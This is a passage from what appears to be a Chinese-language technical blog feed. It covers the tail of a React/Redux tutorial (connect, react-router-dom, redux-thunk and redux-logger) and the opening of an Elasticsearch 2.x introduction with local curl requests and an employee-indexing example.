class="string">"./components/FilterLink.jsx"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; FILTER_TYPE_MAP &#125; <span class="keyword">from</span> <span class="string">"./constants"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = createStore(rootReducer);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;AddTodo /&gt;</span><br><span class="line">        &lt;TodoList /&gt;</span><br><span class="line">        &#123;<span class="built_in">Object</span>.keys(FILTER_TYPE_MAP).map(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> filter = FILTER_TYPE_MAP[key];</span><br><span class="line">          <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">FilterLink</span> <span class="attr">key</span>=<span class="string">&#123;filter&#125;</span> <span class="attr">filter</span>=<span class="string">&#123;filter&#125;</span> /&gt;</span></span>;</span><br><span class="line">        &#125;)&#125;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">ReactDom.render(</span></span><br><span class="line"><span class="regexp">  &lt;Provider store=&#123;store&#125;&gt;</span></span><br><span class="line"><span class="regexp">    &lt;App /</span>&gt;</span><br><span class="line">  &lt;<span class="regexp">/Provider&gt;,</span></span><br><span class="line"><span class="regexp">  document.getElementById("root")</span></span><br><span class="line"><span class="regexp">);</span></span><br></pre></td></tr></table></figure>
<p>接下来我们只需要编写这三个组件，整个应用就搭建完成了。</p>
<p>AddTodo组件的功能是增加todo项，实现和前一节介绍的类似。区别是我们使用了connect方法，mapDispatchToProps负责将用户对组件的操作映射成Action。</p>
<p>这里我们将addTodo action注入到AddTodo中了。这样在AddTodo组件里就可以很方便地触发addTodo action，从而改变state了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./components/AddTodo.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">"react-redux"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; addTodo &#125; <span class="keyword">from</span> <span class="string">"../redux/actions"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AddTodo</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">    <span class="keyword">this</span>.inputRef = React.createRef();</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; addTodo &#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;input type=<span class="string">"text"</span> ref=&#123;<span class="keyword">this</span>.inputRef&#125; /&gt;</span><br><span class="line">        &lt;button</span><br><span class="line">          onClick=&#123;() =&gt; &#123;</span><br><span class="line">            addTodo(<span class="keyword">this</span>.inputRef.current.value);</span><br><span class="line">          &#125;&#125;</span><br><span class="line">        &gt;</span><br><span class="line">          add</span><br><span class="line">        &lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mapDispatchToProps = <span class="function"><span class="params">dispatch</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    addTodo: <span class="function"><span class="params">todo</span> =&gt;</span> &#123;</span><br><span class="line">      dispatch(addTodo(todo));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(<span class="literal">null</span>, mapDispatchToProps)(AddTodo);</span><br></pre></td></tr></table></figure>
<p>FilterLink组件也使用了connect方法，它将setVisiableFilter action注入，从而可以很方便地改变state中的visiableFilter。</p>
<p>mapStateToProps负责将state映射到组件的props中，connect会将state作为mapStateToProps的参数传入，你只需要通过对象取值的形式获取visiableFilter即可。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./components/FilterLink.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">"react-redux"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; setVisiableFilter &#125; <span class="keyword">from</span> <span class="string">"../redux/actions"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FilterLink</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; filter, visiableFilter, setVisiableFilter &#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> style = &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (filter === visiableFilter) &#123;</span><br><span class="line">      style.color = <span class="string">"red"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div</span><br><span class="line">        style=&#123;style&#125;</span><br><span class="line">        onClick=&#123;() =&gt; &#123;</span><br><span class="line">          setVisiableFilter(filter);</span><br><span class="line">        &#125;&#125;</span><br><span class="line">      &gt;</span><br><span class="line">        &#123;filter&#125;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const mapStateToProps = state =&gt; &#123;</span></span><br><span class="line"><span class="regexp">  const &#123; visiableFilter &#125; = state;</span></span><br><span class="line"><span class="regexp">  return &#123;</span></span><br><span class="line"><span class="regexp">    visiableFilter</span></span><br><span class="line"><span class="regexp">  &#125;;</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const mapDispatchToProps = dispatch =&gt; &#123;</span></span><br><span class="line"><span class="regexp">  return &#123;</span></span><br><span class="line"><span class="regexp">    setVisiableFilter: filter =&gt; &#123;</span></span><br><span class="line"><span class="regexp">      dispatch(setVisiableFilter(filter));</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">  &#125;;</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default connect(mapStateToProps, mapDispatchToProps)(FilterLink);</span></span><br></pre></td></tr></table></figure>
<p>前面介绍了connect方法的相关知识，TodoList组件就很容易理解了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./components/TodoList.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">"react-redux"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; toggleTodo &#125; <span class="keyword">from</span> <span class="string">"../redux/actions"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; FILTER_TYPE_MAP &#125; <span class="keyword">from</span> <span class="string">"../constants"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TodoList</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; todos, toggleTodo &#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;ul&gt;</span><br><span class="line">        &#123;todos.map(<span class="function"><span class="params">todo</span> =&gt;</span> (</span><br><span class="line">          &lt;li</span><br><span class="line">            style=&#123;&#123;</span><br><span class="line">              textDecoration: todo.completed ? <span class="string">"line-through"</span> : <span class="string">"none"</span></span><br><span class="line">            &#125;&#125;</span><br><span class="line">            key=&#123;todo.id&#125;</span><br><span class="line">            onClick=&#123;() =&gt; &#123;</span><br><span class="line">              toggleTodo(todo.id);</span><br><span class="line">            &#125;&#125;</span><br><span class="line">          &gt;</span><br><span class="line">            &#123;todo.text&#125;</span><br><span class="line">          &lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">        ))&#125;</span></span><br><span class="line"><span class="regexp">      &lt;/u</span>l&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getFilterTodos = <span class="function">(<span class="params">todos, visiableFilter</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (visiableFilter) &#123;</span><br><span class="line">    <span class="keyword">case</span> FILTER_TYPE_MAP.SHOW_ALL:</span><br><span class="line">      <span class="keyword">return</span> todos;</span><br><span class="line">    <span class="keyword">case</span> FILTER_TYPE_MAP.SHOW_COMPLETED:</span><br><span class="line">      <span class="keyword">return</span> todos.filter(<span class="function"><span class="params">todo</span> =&gt;</span> todo.completed);</span><br><span class="line">    <span class="keyword">case</span> FILTER_TYPE_MAP.SHOW_ACTIVE:</span><br><span class="line">      <span class="keyword">return</span> todos.filter(<span class="function"><span class="params">todo</span> =&gt;</span> !todo.completed);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"unknow filter type"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mapStateToProps = <span class="function"><span class="params">state</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; todos, visiableFilter &#125; = state;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    todos: getFilterTodos(todos, visiableFilter)</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mapDispatchToProps = <span class="function"><span class="params">dispatch</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    toggleTodo: <span class="function"><span class="params">id</span> =&gt;</span> &#123;</span><br><span class="line">      dispatch(toggleTodo(id));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(mapStateToProps, mapDispatchToProps)(TodoList);</span><br></pre></td></tr></table></figure>
<h2 id="react-router-dom"><a href="#react-router-dom" class="headerlink" title="react-router-dom"></a>react-router-dom</h2><p>顾名思义，这个类库可以让我们的应用集成路由功能。</p>
<p>它的使用方法也很容易理解，基本就是根据路径去匹配相应的组件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Route, HashRouter &#125; <span class="keyword">from</span> <span class="string">"react-router-dom"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> BaseLayout <span class="keyword">from</span> <span class="string">"./layouts/BaseLayout.jsx"</span>;</span><br><span class="line"><span class="keyword">import</span> Todo <span class="keyword">from</span> <span class="string">"./pages/Todo/index.jsx"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AppRouter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;HashRouter&gt;</span><br><span class="line">      &lt;Route exac path=<span class="string">"/"</span> component=&#123;BaseLayout&#125; /&gt;</span><br><span class="line">      &lt;Route exac path=<span class="string">"/:filter"</span> component=&#123;Todo&#125; /&gt;</span><br><span class="line">    &lt;<span class="regexp">/HashRouter&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default AppRouter;</span></span><br></pre></td></tr></table></figure>
<p>通过withRouter高阶组件包裹可以让组件很方便地获取到路由参数（match.params），同时它提供了Link组件，该组件点击后可进行路由跳转。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Link, withRouter &#125; <span class="keyword">from</span> <span class="string">"react-router-dom"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FilterLink</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; filter, match &#125; = <span class="keyword">this</span>.props;</span><br><span class="line">    <span class="keyword">const</span> &#123; params &#125; = match;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> style = &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (params.filter === filter) &#123;</span><br><span class="line">      style.color = <span class="string">"red"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;Link to=&#123;filter&#125; style=&#123;style&#125;&gt;</span><br><span class="line">          &#123;filter&#125;</span><br><span class="line">        &lt;<span class="regexp">/Link&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> withRouter(FilterLink);</span><br></pre></td></tr></table></figure>
<p>完整代码详见：<a href="https://github.com/mfaying/redux-demos/tree/master/src/05" target="_blank" rel="noopener">react-router-dom</a></p>
<h2 id="redux中间件"><a href="#redux中间件" class="headerlink" title="redux中间件"></a>redux中间件</h2><p>这里我们介绍两个很有用的redux中间件：redux-thunk、redux-logger</p>
<p>redux-thunk可以让redux处理诸如ajax请求之类的异步操作。</p>
<p>redux-logger可以将redux的状态变化通过控制台日志打印出来，方便调试。</p>
<p>引入它们是很简单的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./redux/index.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; createStore, applyMiddleware &#125; <span class="keyword">from</span> <span class="string">"redux"</span>;</span><br><span class="line"><span class="keyword">import</span> thunk <span class="keyword">from</span> <span class="string">"redux-thunk"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createLogger &#125; <span class="keyword">from</span> <span class="string">"redux-logger"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rootReducer <span class="keyword">from</span> <span class="string">"./reducers"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = createStore(rootReducer, applyMiddleware(thunk, createLogger()));</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store;</span><br></pre></td></tr></table></figure>
<p>这样你就能使用这两个中间件了。</p>
<p>redux-logger不需要什么操作，它会自动将redux日志打印到控制台中。</p>
<p>redux-thunk需要你修改action的写法，以支持异步操作，此时我们的action是一个函数。</p>
<p>示例如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> api <span class="keyword">from</span> <span class="string">"../../apiMock"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> SET_TODOS = <span class="string">"SET_TODOS"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> SET_LOADING = <span class="string">"SET_LOADING"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> setTodos = <span class="function"><span class="params">todos</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    type: SET_TODOS,</span><br><span class="line">    todos</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> setLoading = <span class="function"><span class="params">loading</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    type: SET_LOADING,</span><br><span class="line">    loading</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> fetchTodos = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">dispatch</span> =&gt;</span> &#123;</span><br><span class="line">    dispatch(setLoading(<span class="literal">true</span>));</span><br><span class="line">    api</span><br><span class="line">      .fetchTodoList()</span><br><span class="line">      .then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        dispatch(setTodos(res));</span><br><span class="line">      &#125;)</span><br><span class="line">      .finally(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        dispatch(setLoading(<span class="literal">false</span>));</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>完整代码详见：<a href="https://github.com/mfaying/redux-demos/tree/master/src/06" target="_blank" rel="noopener">redux中间件</a></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>elasticsearch(2.x)教程</title>
    <url>/2019/04/26/elasticsearch%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<p>本文引用自<a href="https://www.elastic.co/guide/cn/elasticsearch/guide/current/docvalues-intro.html" target="_blank" rel="noopener">Elasticsearch:权威指南</a>,基于 Elasticsearch 2.x 版本。书中既有对原理的介绍，也有对es使用的说明，非常值得一读。</p>
<a id="more"></a>
<p>现有的技术都集中在如何解决数据仓库存储以及如何结构化这些数据。 这些看上去都挺美好，直到你实际需要基于这些数据实时做决策分析的时候才发现根本不是那么一回事。Elasticsearch 是一个分布式、可扩展、实时的搜索与数据分析引擎。</p>
<h1 id="基础入门"><a href="#基础入门" class="headerlink" title="基础入门"></a>基础入门</h1><p>Elasticsearch 是一个实时的分布式搜索分析引擎， 它能让你以一个之前从未有过的速度和规模，去探索你的数据。 它被用作全文检索、结构化搜索、分析以及这三个功能的组合。</p>
<p>Elasticsearch 是一个开源的搜索引擎，建立在一个全文搜索引擎库 Apache Lucene™ 基础之上。 Lucene 可能是目前存在的，不论开源还是私有的，拥有最先进，高性能和全功能搜索引擎功能的库。</p>
<p>Elasticsearch 是使用 Java 编写的，它的内部使用 Lucene 做索引与搜索，但是它的目标是使全文检索变得简单， 通过隐藏 Lucene 的复杂性，取而代之的提供一套简单一致的 RESTful API。</p>
<p>然而，Elasticsearch 不仅仅是 Lucene，并且也不仅仅只是一个全文搜索引擎。 它可以被下面这样准确的形容：</p>
<p>1.一个分布式的实时文档存储，每个字段 可以被索引与搜索<br>2.一个分布式实时分析搜索引擎<br>3.能胜任上百个服务节点的扩展，并支持 PB 级别的结构化或者非结构化数据</p>
<p>就 Elasticsearch 而言，起步很简单。对于初学者来说，它预设了一些适当的默认值，并隐藏了复杂的搜索理论知识。 它 开箱即用 。只需最少的理解，你很快就能具有生产力。</p>
<p>随着你知识的积累，你可以利用 Elasticsearch 更多的高级特性，它的整个引擎是可配置并且灵活的。 从众多高级特性中，挑选恰当去修饰的 Elasticsearch，使它能解决你本地遇到的问题。</p>
<h2 id="安装并运行Elasticsearch"><a href="#安装并运行Elasticsearch" class="headerlink" title="安装并运行Elasticsearch"></a>安装并运行Elasticsearch</h2><p>安装 Elasticsearch 之前，你需要先安装一个较新的版本的 Java。博主安装的是java8。</p>
<p>之后，你可以从 elastic 的官网 elastic.co/downloads/elasticsearch 获取Elasticsearch(2.x)。</p>
<p>下载并解压适合你操作系统的 Elasticsearch 版本，按照下面的操作，在前台(foregroud)启动 Elasticsearch：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd elasticsearch-&lt;version&gt;</span><br><span class="line">./bin/elasticsearch</span><br></pre></td></tr></table></figure>
<p>如果你想把 Elasticsearch 作为一个守护进程在后台运行，那么可以在后面添加参数 -d</p>
<p>测试 Elasticsearch 是否启动成功，可以打开另一个终端，执行以下操作：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl 'http://localhost:9200/?pretty'</span><br></pre></td></tr></table></figure>
<p>你应该得到和下面类似的响应(response)：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span> : <span class="string">"Tom Foster"</span>,</span><br><span class="line">  <span class="attr">"cluster_name"</span> : <span class="string">"elasticsearch"</span>,</span><br><span class="line">  <span class="attr">"version"</span> : &#123;</span><br><span class="line">    <span class="attr">"number"</span> : <span class="string">"2.1.0"</span>,</span><br><span class="line">    <span class="attr">"build_hash"</span> : <span class="string">"72cd1f1a3eee09505e036106146dc1949dc5dc87"</span>,</span><br><span class="line">    <span class="attr">"build_timestamp"</span> : <span class="string">"2015-11-18T22:40:03Z"</span>,</span><br><span class="line">    <span class="attr">"build_snapshot"</span> : <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"lucene_version"</span> : <span class="string">"5.3.1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"tagline"</span> : <span class="string">"You Know, for Search"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>单个 节点 可以作为一个运行中的 Elasticsearch 的实例。 而一个 集群 是一组拥有相同 cluster.name 的节点， 他们能一起工作并共享数据，还提供容错与可伸缩性。(当然，一个单独的节点也可以组成一个集群) 你可以在 elasticsearch.yml 配置文件中 修改 cluster.name ，该文件会在节点启动时加载 (译者注：这个重启服务后才会生效)。 </p>
<p>elasticsearch-head是一款专门针对于elasticsearch的客户端工具，使用比较方便。</p>
<h2 id="和-Elasticsearch-交互"><a href="#和-Elasticsearch-交互" class="headerlink" title="和 Elasticsearch 交互"></a>和 Elasticsearch 交互</h2><p>所有其他语言可以使用 RESTful API 通过端口 9200 和 Elasticsearch 进行通信，你可以用你最喜爱的 web 客户端访问 Elasticsearch 。事实上，正如你所看到的，你甚至可以使用 curl 命令来和 Elasticsearch 交互。</p>
<p>一个 Elasticsearch 请求和任何 HTTP 请求一样由若干相同的部件组成：</p>
<p>curl -X<verb> ‘<protocol>://<host>:<port>/<path>?&lt;QUERY_STRING&gt;’ -d ‘<body>‘</body></path></port></host></protocol></verb></p>
<p>被 &lt; &gt; 标记的部件：</p>
<p>VERB：适当的 HTTP 方法 或 谓词 : GET<code>、</code>POST<code>、</code>PUT<code>、</code>HEAD 或者 <code>DELETE</code>。</p>
<p>PROTOCOL：http 或者 https<code>（如果你在 Elasticsearch 前面有一个</code>https 代理）</p>
<p>HOST：Elasticsearch 集群中任意节点的主机名，或者用 localhost 代表本地机器上的节点。</p>
<p>PORT：运行 Elasticsearch HTTP 服务的端口号，默认是 9200 。</p>
<p>PATH：API 的终端路径（例如 _count 将返回集群中文档数量）。Path 可能包含多个组件，例如：_cluster/stats 和 _nodes/stats/jvm 。</p>
<p>QUERY_STRING：任意可选的查询字符串参数 (例如 ?pretty 将格式化地输出 JSON 返回值，使其更容易阅读)</p>
<p>BODY：一个 JSON 格式的请求体 (如果请求需要的话)</p>
<p>例如，计算集群中文档的数量，我们可以用这个:<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -XGET 'http://localhost:9200/_count?pretty' -d '</span><br><span class="line">&#123;</span><br><span class="line">    "query": &#123;</span><br><span class="line">        "match_all": &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">'</span><br></pre></td></tr></table></figure></p>
<p>Elasticsearch 返回一个 HTTP 状态码（例如：200 OK<code>）和（除</code>HEAD<code>请求）一个 JSON 格式的返回值。前面的</code>curl 请求将返回一个像下面一样的 JSON 体：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"count"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"_shards"</span> : &#123;</span><br><span class="line">        <span class="attr">"total"</span> : <span class="number">5</span>,</span><br><span class="line">        <span class="attr">"successful"</span> : <span class="number">5</span>,</span><br><span class="line">        <span class="attr">"failed"</span> : <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在返回结果中没有看到 HTTP 头信息是因为我们没有要求curl<code>显示它们。想要看到头信息，需要结合</code>-i 参数来使用 curl 命令：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -i -XGET 'localhost:9200/'</span><br></pre></td></tr></table></figure></p>
<p>在书中剩余的部分，我们将用缩写格式来展示这些 curl 示例，所谓的缩写格式就是省略请求中所有相同的部分，例如主机名、端口号以及 curl 命令本身。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /_count</span><br><span class="line">&#123;</span><br><span class="line">    "query": &#123;</span><br><span class="line">        "match_all": &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="面向文档"><a href="#面向文档" class="headerlink" title="面向文档"></a>面向文档</h2><p>使用关系型数据库的行和列存储，相当于是把一个表现力丰富的对象挤压到一个非常大的电子表格中：你必须将这个对象扁平化来适应表结构–通常一个字段&gt;对应一列–而且又不得不在每次查询时重新构造对象。</p>
<p>Elasticsearch 是 面向文档 的，意味着它存储整个对象或 文档_。Elasticsearch 不仅存储文档，而且 _索引 每个文档的内容使之可以被检索。在 Elasticsearch 中，你 对文档进行索引、检索、排序和过滤–而不是对行列数据。这是一种完全不同的思考数据的方式，也是 Elasticsearch 能支持复杂全文检索的原因。</p>
<p>Elasticsearch 使用 JavaScript Object Notation 或者 JSON 作为文档的序列化格式。JSON 序列化被大多数编程语言所支持，并且已经成为 NoSQL 领域的标准格式。 它简单、简洁、易于阅读。</p>
<h2 id="一个简单的例子"><a href="#一个简单的例子" class="headerlink" title="一个简单的例子"></a>一个简单的例子</h2><p>为了对 Elasticsearch 能实现什么及其上手容易程度有一个基本印象，让我们从一个简单的教程开始并介绍索引、搜索及聚合等基础概念。</p>
<p>我们的任务是为此创建一个雇员目录，有一些业务需求：</p>
<p>1.支持包含多值标签、数值、以及全文本的数据<br>2.检索任一雇员的完整信息<br>3.允许结构化搜索，比如查询 30 岁以上的员工<br>4.允许简单的全文搜索以及较复杂的短语搜索<br>5.支持在匹配文档内容中高亮显示搜索片段<br>6.支持基于数据创建和管理分析仪表盘</p>
<p>第一个业务需求就是存储雇员数据。 这将会以 雇员文档 的形式存储：一个文档代表一个雇员。存储数据到 Elasticsearch 的行为叫做 索引 ，但在索引一个文档之前，需要确定将文档存储在哪里。</p>
<p>一个 Elasticsearch 集群可以 包含多个 索引 ，相应的每个索引可以包含多个 类型 。 这些不同的类型存储着多个 文档 ，每个文档又有 多个 属性 。</p>
<p>你也许已经注意到 索引 这个词在 Elasticsearch 语境中包含多重意思， 所以有必要做一点儿说明：</p>
<p>索引（名词）：如前所述，一个 索引 类似于传统关系数据库中的一个 数据库 ，是一个存储关系型文档的地方。 索引 (index) 的复数词为 indices 或 indexes 。</p>
<p>索引（动词）：索引一个文档 就是存储一个文档到一个 索引 （名词）中以便它可以被检索和查询到。这非常类似于 SQL 语句中的 INSERT 关键词，除了文档已存在时新文档会替换旧文档情况之外。</p>
<p>倒排索引：关系型数据库通过增加一个 索引 比如一个 B树（B-tree）索引 到指定的列上，以便提升数据检索速度。Elasticsearch 和 Lucene 使用了一个叫做 倒排索引 的结构来达到相同的目的。默认的，一个文档中的每一个属性都是 被索引 的（有一个倒排索引）和可搜索的。一个没有倒排索引的属性是不能被搜索到的。</p>
<p>实践中这非常简单<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PUT /megacorp/employee/1</span><br><span class="line">&#123;</span><br><span class="line">    "first_name" : "John",</span><br><span class="line">    "last_name" :  "Smith",</span><br><span class="line">    "age" :        25,</span><br><span class="line">    "about" :      "I love to go rock climbing",</span><br><span class="line">    "interests": [ "sports", "music" ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>路径 /megacorp/employee/1 包含了三部分的信息：<br>megacorp 索引名称<br>employee 类型名称<br>1 特定雇员的ID<br>请求体 JSON 文档</p>
<p>进行下一步前，让我们增加更多的员工信息到目录中：</p>
